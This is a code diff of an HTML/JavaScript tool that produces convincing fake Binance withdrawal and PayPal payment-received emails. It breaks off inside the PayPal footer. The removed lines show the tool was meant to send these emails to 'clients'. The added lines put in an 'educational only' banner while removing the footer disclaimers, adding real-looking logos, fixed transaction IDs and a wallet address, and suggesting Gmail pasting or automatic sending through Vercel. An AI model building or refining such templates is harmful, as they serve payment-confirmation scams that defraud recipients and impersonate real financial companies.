@@ -26,7 +26,7 @@
                 <p class="text-slate-600">Educational design templates - 14 major payment platforms</p>
                 <div class="mt-4 inline-block bg-yellow-100 border-2 border-yellow-400 rounded-lg px-4 py-2">
                     <p class="text-sm font-semibold text-yellow-800">
-       Select a platform and send an email 
+                        ⚠️ EDUCATIONAL ONLY - These are static design templates, not functional emails
                     </p>
                 </div>
             </div>
@@ -94,7 +94,7 @@
                     <!-- Wallet Address Input -->
                     <div>
                         <label class="block text-sm font-medium text-slate-700 mb-2">
-                            Wallet Address (only add a wallet address if the client if you are sending crypto or sending to a crypto wallet)
+                            Wallet Address (for crypto templates)
                         </label>
                         <div class="relative">
                             <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -139,7 +139,8 @@
                             </button>
                         </div>
                         <p class="text-xs text-slate-500 mt-2">
-                            💡 kindly click send email after adding the cliens email
+                            💡 <strong>Best method:</strong> Click "Copy Template HTML" then paste into Gmail/Outlook for full design!
+                            Or deploy to Vercel for automatic sending (see setup guide).
                         </p>
                         <div id="emailStatus" class="mt-3 hidden"></div>
                     </div>
@@ -244,185 +245,354 @@
             
             const templates = {
                 binance: `
-                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f5f5f5;">
+                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #ffffff;">
                         <!-- Binance Header with Logo -->
-                        <div style="background-color: #1e2329; padding: 20px 30px; text-align: center;">
-                            <div style="display: inline-flex; align-items: center; gap: 8px;">
-                                <span style="color: #F0B90B; font-size: 24px;">◆</span>
-                                <h1 style="margin: 0; font-size: 24px; color: #F0B90B; font-weight: bold;">BINANCE</h1>
+                        <div style="background-color: #0b0e11; padding: 30px; text-align: center;">
+                            <div style="display: inline-flex; align-items: center; gap: 10px;">
+                                <svg width="24" height="24" viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg">
+                                    <g fill="#F3BA2F">
+                                        <path d="M38.73 53.2l24.59-24.58 24.6 24.6 14.3-14.31L63.32 0 24.43 38.9l14.3 14.31zm-14.31 10.1l-14.3 14.31 14.31 14.3 14.3-14.3-14.31-14.31zm14.31 24.6l24.6 24.59 24.59-24.6 14.31 14.29v.02L63.32 140.61 24.43 101.72v-.02l14.3-14.3zm48.87-14.31l14.31 14.3 14.3-14.3-14.3-14.31-14.31 14.31z"/>
+                                        <path d="M77.83 63.3L63.32 48.78 52.59 59.51l-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/>
+                                    </g>
+                                </svg>
+                                <h1 style="margin: 0; font-size: 20px; color: #F0B90B; font-weight: bold; letter-spacing: 2px;">BINANCE</h1>
                             </div>
                         </div>
                         
                         <!-- White Content Area -->
                         <div style="padding: 40px 30px; background-color: #fff;">
-                            <h2 style="color: #1e2329; margin-top: 0; font-size: 20px; font-weight: bold;">${currency} Withdrawal Successful</h2>
-                            <p style="font-size: 14px; color: #1e2329; line-height: 1.6; margin: 15px 0;">
+                            <h2 style="color: #0b0e11; margin-top: 0; margin-bottom: 20px; font-size: 22px; font-weight: bold;">${currency} Withdrawal Successful</h2>
+                            
+                            <p style="font-size: 14px; color: #0b0e11; line-height: 1.6; margin: 0 0 25px 0;">
                                 You've successfully withdrawn ${formattedAmount} from your account.
                             </p>
                             
                             <!-- Transaction Details -->
-                            <div style="margin: 25px 0;">
-                                <div style="margin-bottom: 12px;">
-                                    <span style="color: #1e2329; font-size: 13px; font-weight: bold;">Withdrawal Address:</span>
-                                    <span style="color: #707a8a; font-size: 13px; font-family: monospace; word-break: break-all; display: block; margin-top: 4px;">${currentWalletAddress || '0x' + Math.random().toString(16).substr(2, 40)}</span>
+                            <div style="margin: 0 0 25px 0;">
+                                <div style="margin-bottom: 15px;">
+                                    <p style="margin: 0 0 5px 0;">
+                                        <span style="color: #0b0e11; font-size: 14px; font-weight: bold;">Withdrawal Address</span>
+                                        <span style="color: #0b0e11; font-size: 14px;"> : </span>
+                                        <span style="color: #474d57; font-size: 13px; font-family: 'Courier New', monospace; word-break: break-all;">${currentWalletAddress || 'TJppe7uHmBxhKMKe4k38fcVNfVaSqpWeh'}</span>
+                                    </p>
                                 </div>
-                                <div style="margin-bottom: 12px;">
-                                    <span style="color: #1e2329; font-size: 13px; font-weight: bold;">Transaction ID:</span>
-                                    <span style="color: #707a8a; font-size: 13px; font-family: monospace; word-break: break-all; display: block; margin-top: 4px;">0x${Math.random().toString(16).substr(2, 64)}</span>
+                                <div style="margin-bottom: 15px;">
+                                    <p style="margin: 0 0 5px 0;">
+                                        <span style="color: #0b0e11; font-size: 14px; font-weight: bold;">Transaction ID</span>
+                                        <span style="color: #0b0e11; font-size: 14px;"> : </span>
+                                        <span style="color: #474d57; font-size: 13px; font-family: 'Courier New', monospace; word-break: break-all;">1HcDnIQYhF1sr3SyYA24tFxBisuggJZzbuphiJqBrPmqYP0TGaLooCMxmAh</span>
+                                    </p>
                                 </div>
                             </div>
                             
                             <!-- Yellow Button -->
                             <div style="margin: 30px 0;">
-                                <a href="#" style="display: inline-block; background-color: #F0B90B; color: #1e2329; padding: 12px 30px; text-decoration: none; font-size: 14px; font-weight: bold; border-radius: 4px;">
+                                <a href="#" style="display: inline-block; background-color: #FCD535; color: #0b0e11; padding: 12px 28px; text-decoration: none; font-size: 14px; font-weight: 600; border-radius: 4px;">
                                     Visit Your Dashboard
                                 </a>
                             </div>
                             
                             <!-- Warning Message -->
-                            <div style="margin: 25px 0; padding: 15px; background-color: #fef6e6; border-left: 3px solid #F0B90B; border-radius: 4px;">
-                                <p style="margin: 0; font-size: 13px; color: #1e2329; line-height: 1.5;">
-                                    Don't recognize this activity? Please <a href="#" style="color: #F0B90B; text-decoration: none; font-weight: bold;">reset your password</a> and contact <a href="#" style="color: #F0B90B; text-decoration: none; font-weight: bold;">customer support</a> immediately.
+                            <div style="margin: 25px 0;">
+                                <p style="margin: 0; font-size: 13px; color: #0b0e11; line-height: 1.6;">
+                                    Don't recognize this activity? Please <a href="#" style="color: #FCD535; text-decoration: underline; font-weight: normal;">reset your password</a> and contact <a href="#" style="color: #FCD535; text-decoration: underline; font-weight: normal;">customer support</a> immediately.
                                 </p>
                             </div>
                             
-                            <p style="font-size: 13px; color: #707a8a; line-height: 1.6; margin: 20px 0;">
+                            <p style="font-size: 13px; color: #474d57; line-height: 1.6; margin: 20px 0;">
                                 Please check with the receiving platform or wallet as the transaction is already confirmed on the blockchain explorer.
                             </p>
                             
-                            <p style="font-size: 12px; color: #707a8a; font-style: italic; margin: 20px 0;">
+                            <p style="font-size: 12px; color: #848e9c; font-style: italic; margin: 25px 0 30px 0;">
                                 This is an automated message, please do not reply.
                             </p>
                             
                             <!-- Divider -->
-                            <div style="border-top: 1px solid #e5e5e5; margin: 30px 0;"></div>
+                            <div style="border-top: 1px solid #eaecef; margin: 30px 0;"></div>
                             
                             <!-- Stay Connected -->
-                            <div style="text-align: center;">
-                                <p style="font-size: 14px; color: #F0B90B; font-weight: bold; margin-bottom: 15px;">Stay connected!</p>
-                                <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
-                                    <span style="font-size: 20px; color: #707a8a;">✕</span>
-                                    <span style="font-size: 20px; color: #707a8a;">▶</span>
-                                    <span style="font-size: 20px; color: #707a8a;">f</span>
-                                    <span style="font-size: 20px; color: #707a8a;">in</span>
-                                    <span style="font-size: 20px; color: #707a8a;">📧</span>
-                                    <span style="font-size: 20px; color: #707a8a;">📱</span>
+                            <div style="text-align: center; margin-top: 30px;">
+                                <p style="font-size: 14px; color: #FCD535; font-weight: 600; margin-bottom: 15px;">Stay connected!</p>
+                                <div style="margin: 15px 0;">
+                                    <!-- Twitter/X -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Telegram -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.941z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Facebook -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- LinkedIn -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- YouTube -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Reddit -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Instagram -->
+                                    <a href="#" style="display: inline-block; margin: 0 6px; text-decoration: none;">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#848e9c" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/>
+                                        </svg>
+                                    </a>
                                 </div>
+                            </div>
+                            
+                            <!-- Bottom Info -->
+                            <div style="text-align: center; margin-top: 35px;">
+                                <p style="font-size: 12px; color: #848e9c; margin: 5px 0; line-height: 1.5;">
+                                    To stay secure, setup your phishing code <a href="#" style="color: #FCD535; text-decoration: underline;">here</a>
+                                </p>
                             </div>
                         </div>
                         
                         <!-- Footer -->
-                        <div style="padding: 20px 30px; background-color: #f5f5f5; text-align: center; font-size: 11px; color: #707a8a; line-height: 1.6;">
-                            <p style="margin: 5px 0;">To stop receiving these emails, simply <a href="#" style="color: #707a8a; text-decoration: underline;">unsubscribe</a> here.</p>
-                            <p style="margin: 5px 0;">Binance will never ask for your password or 2FA codes. Be aware of phishing attempts.</p>
-                            <p style="margin: 10px 0 5px 0;">© ${currentYear} Binance. All rights reserved.</p>
-                            <p style="margin: 5px 0;">Educational design template only</p>
+                        <div style="padding: 25px 30px; background-color: #fafafa; text-align: center; font-size: 11px; color: #848e9c; line-height: 1.8;">
+                            <p style="margin: 0 0 8px 0;"><strong style="color: #474d57;">Risk warning:</strong> Cryptocurrency trading is subject to high market risk. Binance will make the best efforts to choose high-quality coins, but will not be responsible for your trading losses. Please trade with caution.</p>
+                            <p style="margin: 8px 0;"><strong style="color: #474d57;">Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official Binance.com website when entering sensitive data.</p>
+                            <p style="margin: 15px 0 5px 0; color: #474d57;">© ${currentYear} Binance. All rights reserved.</p>
                         </div>
                     </div>
                 `,
                 paypal: `
-                    <div style="font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f5f7fa;">
-                        <div style="background-color: #0070ba; padding: 25px; text-align: center;">
-                            <div style="font-size: 32px; font-weight: bold; color: #fff;">PayPal</div>
+                    <div style="font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #1a1a1a; color: #ffffff;">
+                        <!-- Greeting -->
+                        <div style="padding: 30px 30px 10px 30px; background-color: #1a1a1a;">
+                            <p style="font-size: 16px; color: #b0b0b0; margin: 0 0 5px 0;">Hello,</p>
                         </div>
-                        <div style="padding: 40px 30px; background-color: #fff;">
-                            <h2 style="color: #2c2e2f; margin-top: 0; font-size: 24px;">You've got money!</h2>
-                            <p style="font-size: 16px; color: #2c2e2f; line-height: 1.6;">You received a payment.</p>
-                            <div style="background-color: #f5f7fa; padding: 30px; border-radius: 5px; margin: 30px 0; text-align: center;">
-                                <div style="font-size: 18px; color: #687173; margin-bottom: 10px;">Amount received</div>
-                                <div style="font-size: 48px; font-weight: bold; color: #0070ba;">${formattedAmount} ${currency}</div>
+                        
+                        <!-- PayPal Logo Circle -->
+                        <div style="padding: 0 30px 20px 30px; background-color: #1a1a1a;">
+                            <svg width="80" height="80" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                                <!-- White circle background -->
+                                <circle cx="100" cy="100" r="100" fill="#FFFFFF"/>
+                                <!-- PayPal P logo - Dark Blue -->
+                                <path fill="#003087" d="M 65 50 L 50 50 C 48.5 50 47.2 51.2 47 52.7 L 40 105 C 39.8 106.3 40.8 107.5 42.1 107.5 L 50 107.5 C 51.5 107.5 52.8 106.3 53 104.8 L 55 90 C 55.2 88.5 56.5 87.3 58 87.3 L 64 87.3 C 75 87.3 81 82 82.5 71.5 C 83.3 66.5 82.5 62.5 80 59.5 C 77.3 56.3 72.5 50 65 50 Z M 67 72.5 C 66.2 77.5 62.5 77.5 58.5 77.5 L 56 77.5 L 58 65 C 58.1 64.2 58.8 63.5 59.6 63.5 L 61 63.5 C 64 63.5 66.8 63.5 68.3 65.3 C 69.3 66.5 69.3 68.3 67 72.5 Z"/>
+                                <!-- PayPal P logo - Light Blue -->
+                                <path fill="#009CDE" d="M 90 50 L 75 50 C 73.5 50 72.2 51.2 72 52.7 L 65 105 C 64.8 106.3 65.8 107.5 67.1 107.5 L 75 107.5 C 76.5 107.5 77.8 106.3 78 104.8 L 80 90 C 80.2 88.5 81.5 87.3 83 87.3 L 89 87.3 C 100 87.3 106 82 107.5 71.5 C 108.3 66.5 107.5 62.5 105 59.5 C 102.3 56.3 97.5 50 90 50 Z M 92 72.5 C 91.2 77.5 87.5 77.5 83.5 77.5 L 81 77.5 L 83 65 C 83.1 64.2 83.8 63.5 84.6 63.5 L 86 63.5 C 89 63.5 91.8 63.5 93.3 65.3 C 94.3 66.5 94.3 68.3 92 72.5 Z"/>
+                                <!-- PayPal text - "Pay" in dark blue -->
+                                <text x="45" y="145" font-family="Verdana, Arial, sans-serif" font-size="28" font-weight="bold" fill="#003087" font-style="italic">Pay</text>
+                                <!-- PayPal text - "Pal" in light blue -->
+                                <text x="95" y="145" font-family="Verdana, Arial, sans-serif" font-size="28" font-weight="bold" fill="#009CDE" font-style="italic">Pal</text>
+                            </svg>
+                        </div>
+                        
+                        <!-- Main Message -->
+                        <div style="padding: 0 30px 25px 30px; background-color: #1a1a1a;">
+                            <h1 style="color: #ffffff; margin: 0 0 30px 0; font-size: 28px; font-weight: 400; line-height: 1.3;">
+                                Paypal Inc. has sent you ${formattedAmount}.
+                            </h1>
+                            
+                            <p style="font-size: 16px; color: #b0b0b0; margin: 0 0 30px 0;">
+                                Note from Paypal Inc.:
+                            </p>
+                            
+                            <!-- Quote Box -->
+                            <div style="border-left: 4px solid #5b9bd5; padding-left: 20px; margin: 0 0 35px 0;">
+                                <p style="font-size: 20px; color: #ffffff; margin: 0; line-height: 1.4; font-style: italic;">
+                                    " Your funds have been successfully delivered. Enjoy! "
+                                </p>
                             </div>
-                            <div style="border-top: 1px solid #e1e8ee; padding-top: 20px;">
-                                <table style="width: 100%; font-size: 14px; color: #2c2e2f;">
-                                    <tr>
-                                        <td style="padding: 10px 0; color: #687173;">Transaction ID:</td>
-                                        <td style="padding: 10px 0; text-align: right; font-family: monospace;">${Math.random().toString(36).substr(2, 17).toUpperCase()}</td>
-                                    </tr>
-                                    <tr>
-                                        <td style="padding: 10px 0; color: #687173;">Date:</td>
-                                        <td style="padding: 10px 0; text-align: right;">${currentDate}</td>
-                                    </tr>
-                                    <tr>
-                                        <td style="padding: 10px 0; color: #687173;">Status:</td>
-                                        <td style="padding: 10px 0; text-align: right;"><span style="color: #1c8e40; font-weight: bold;">Completed</span></td>
-                                    </tr>
-                                </table>
+                            
+                            <!-- Transaction Details -->
+                            <div style="margin-bottom: 35px;">
+                                <div style="margin-bottom: 15px;">
+                                    <span style="color: #ffffff; font-size: 15px; display: inline-block; width: 140px;">Transaction ID</span>
+                                    <span style="color: #5b9bd5; font-size: 15px; text-decoration: underline;">9NJ35286HA9214528</span>
+                                </div>
+                                <div>
+                                    <span style="color: #ffffff; font-size: 15px; display: inline-block; width: 140px;">Transaction date</span>
+                                    <span style="color: #ffffff; font-size: 15px;">${currentDate}</span>
+                                </div>
                             </div>
-                            <div style="margin-top: 30px; padding: 20px; background-color: #f5f7fa; border-radius: 5px; font-size: 14px; color: #687173;">
-                                <strong>Note:</strong> It may take a few moments for this transaction to appear in your account.
+                            
+                            <!-- Divider Line -->
+                            <div style="border-bottom: 1px solid #404040; margin: 35px 0;"></div>
+                            
+                            <!-- Money Received -->
+                            <div style="margin-bottom: 35px;">
+                                <div>
+                                    <span style="color: #ffffff; font-size: 15px; display: inline-block; width: 140px;">Money received</span>
+                                    <span style="color: #ffffff; font-size: 15px; font-weight: 600;">${formattedAmount}</span>
+                                </div>
+                            </div>
+                            
+                            <!-- Divider Line -->
+                            <div style="border-bottom: 1px solid #404040; margin: 35px 0;"></div>
+                            
+                            <!-- Note -->
+                            <p style="font-size: 14px; color: #b0b0b0; line-height: 1.6; margin: 0 0 30px 0;">
+                                Please note it may take a little while for this payment to appear in the Activity section of your account.
+                            </p>
+                            
+                            <!-- Get Details Button -->
+                            <div style="text-align: left; margin: 35px 0;">
+                                <a href="#" style="display: inline-block; background-color: #b8b8ff; color: #1a1a1a; padding: 14px 80px; text-decoration: none; font-size: 16px; font-weight: 500; border-radius: 25px;">
+                                    Get Details
+                                </a>
                             </div>
                         </div>
-                        <div style="padding: 30px; background-color: #f5f7fa; text-align: center; font-size: 12px; color: #687173;">
-                            <p style="margin: 5px 0;">© 1999-2024 PayPal, Inc. All rights reserved.</p>
-                            <p style="margin: 5px 0;">Educational template for design purposes only</p>
+                        
+                        <!-- Footer with PayPal Logo and Curve -->
+                        <div style="position: relative; background-color: #1a1a1a; padding: 40px 30px 30px 30px;">
+                            <!-- Curved White Section -->
+                            <div style="background-color: #f5f5f5; border-radius: 80px 80px 0 0; padding: 50px 30px 30px 30px; margin: 0 -30px;">
+                                <!-- PayPal Logo -->
+                                <div style="text-align: left; margin-bottom: 30px;">
+                                    <svg width="200" height="55" viewBox="0 0 300 80" xmlns="http://www.w3.org/2000/svg">
+                                        <g>
+                                            <path fill="#003087" d="M 31.777 13.566 L 23.277 13.566 C 22.677 13.566 22.177 13.966 22.077 14.566 L 18.677 37.966 C 18.577 38.466 18.977 38.866 19.477 38.866 L 23.077 38.866 C 23.577 38.866 23.977 38.566 24.077 38.066 L 24.877 33.266 C 24.977 32.666 25.477 32.266 26.077 32.266 L 28.477 32.266 C 33.677 32.266 36.777 29.766 37.577 24.866 C 37.977 22.666 37.677 20.866 36.677 19.666 C 35.577 18.366 33.477 13.566 31.777 13.566 Z M 32.777 25.166 C 32.377 27.866 30.277 27.866 28.077 27.866 L 26.877 27.866 L 27.677 22.666 C 27.777 22.266 28.077 21.966 28.477 21.966 L 29.077 21.966 C 30.577 21.966 31.977 21.966 32.677 22.766 C 33.177 23.266 33.177 24.066 32.777 25.166 Z"/>
+                                            <path fill="#0070E0" d="M 56.877 24.966 L 53.177 24.966 C 52.777 24.966 52.477 25.266 52.377 25.666 L 52.177 26.866 L 51.877 26.466 C 50.977 25.166 49.077 24.766 47.177 24.766 C 43.177 24.766 39.777 27.966 39.077 32.566 C 38.677 34.866 39.277 37.066 40.677 38.566 C 41.977 39.966 43.777 40.566 45.877 40.566 C 49.277 40.566 51.177 38.366 51.177 38.366 L 50.977 39.566 C 50.877 40.066 51.277 40.466 51.777 40.466 L 55.077 40.466 C 55.677 40.466 56.177 40.066 56.277 39.466 L 58.277 25.866 C 58.277 25.366 57.977 24.966 56.877 24.966 Z M 52.477 32.666 C 52.077 34.866 50.377 36.366 48.177 36.366 C 47.077 36.366 46.177 36.066 45.577 35.366 C 45.077 34.666 44.777 33.666 44.977 32.566 C 45.377 30.366 47.077 28.866 49.277 28.866 C 50.377 28.866 51.277 29.266 51.877 29.866 C 52.577 30.566 52.777 31.566 52.477 32.666 Z"/>
+                                            <path fill="#003087" d="M 82.177 24.966 L 78.477 24.966 C 78.077 24.966 77.677 25.166 77.477 25.566 L 72.377 33.466 L 70.177 25.866 C 70.077 25.466 69.677 25.066 69.277 25.066 L 65.577 25.066 C 65.077 25.066 64.677 25.566 64.877 26.066 L 68.877 38.466 L 65.177 43.566 C 64.877 43.966 65.077 44.566 65.577 44.566 L 69.177 44.566 C 69.577 44.566 69.977 44.366 70.177 43.966 L 82.677 26.166 C 83.077 25.666 82.777 24.966 82.177 24.966 Z"/>
+                                            <path fill="#0070E0" d="M 103.177 13.566 L 94.677 13.566 C 94.077 13.566 93.577 13.966 93.477 14.566 L 90.077 37.966 C 89.977 38.466 90.377 38.866 90.877 38.866 L 94.777 38.866 C 95.177 38.866 95.577 38.566 95.577 38.166 L 96.477 33.266 C 96.577 32.666 97.077 32.266 97.677 32.266 L 100.077 32.266 C 105.277 32.266 108.377 29.766 109.177 24.866 C 109.577 22.666 109.277 20.866 108.277 19.666 C 107.177 18.366 105.077 13.566 103.177 13.566 Z M 104.377 25.166 C 103.977 27.866 101.877 27.866 99.677 27.866 L 98.477 27.866 L 99.277 22.666 C 99.377 22.266 99.677 21.966 100.077 21.966 L 100.677 21.966 C 102.177 21.966 103.577 21.966 104.277 22.766 C 104.677 23.266 104.677 24.066 104.377 25.166 Z"/>
+                                            <path fill="#0070E0" d="M 128.377 24.966 L 124.677 24.966 C 124.277 24.966 123.977 25.266 123.877 25.666 L 123.677 26.866 L 123.377 26.466 C 122.477 25.166 120.577 24.766 118.677 24.766 C 114.677 24.766 111.277 27.966 110.577 32.566 C 110.177 34.866 110.777 37.066 112.177 38.566 C 113.477 39.966 115.277 40.566 117.377 40.566 C 120.777 40.566 122.677 38.366 122.677 38.366 L 122.477 39.566 C 122.377 40.066 122.777 40.466 123.277 40.466 L 126.577 40.466 C 127.177 40.466 127.677 40.066 127.777 39.466 L 129.777 25.866 C 129.777 25.366 129.377 24.966 128.377 24.966 Z M 123.977 32.666 C 123.577 34.866 121.877 36.366 119.677 36.366 C 118.577 36.366 117.677 36.066 117.077 35.366 C 116.577 34.666 116.277 33.666 116.477 32.566 C 116.877 30.366 118.577 28.866 120.777 28.866 C 121.877 28.866 122.777 29.266 123.377 29.866 C 124.077 30.566 124.177 31.566 123.977 32.666 Z"/>
+                                            <path fill="#0070E0" d="M 136.577 14.366 L 133.077 37.966 C 132.977 38.466 133.377 38.866 133.877 38.866 L 136.977 38.866 C 137.577 38.866 138.077 38.466 138.177 37.866 L 141.577 14.466 C 141.677 13.966 141.277 13.566 140.777 13.566 L 137.077 13.566 C 136.877 13.566 136.677 13.866 136.577 14.366 Z"/>
+                                        </g>
+                                    </svg>
+                                </div>
+                                
+                                <!-- Footer Links -->
+                                <div style="margin-bottom: 25px;">
+                                    <a href="#" style="color: #5b9bd5; text-decoration: none; font-size: 13px; margin-right: 15px;">Help & Contact</a>
+                                    <span style="color: #999; margin-right: 15px;">|</span>
+                                    <a href="#" style="color: #5b9bd5; text-decoration: none; font-size: 13px; margin-right: 15px;">Security</a>
+                                    <span style="color: #999; margin-right: 15px;">|</span>
+                                    <a href="#" style="color: #5b9bd5; text-decoration: none; font-size: 13px;">Apps</a>
+                                </div>
+                                
+                                <!-- Social Icons - Real Icons -->
+                                <div style="margin-bottom: 30px;">
+                                    <!-- Twitter/X -->
+                                    <a href="#" style="display: inline-block; margin-right: 15px; text-decoration: none;">
+                                        <svg width="22" height="22" viewBox="0 0 24 24" fill="#666666" xmlns="http://www.w3.org/2000/svg">
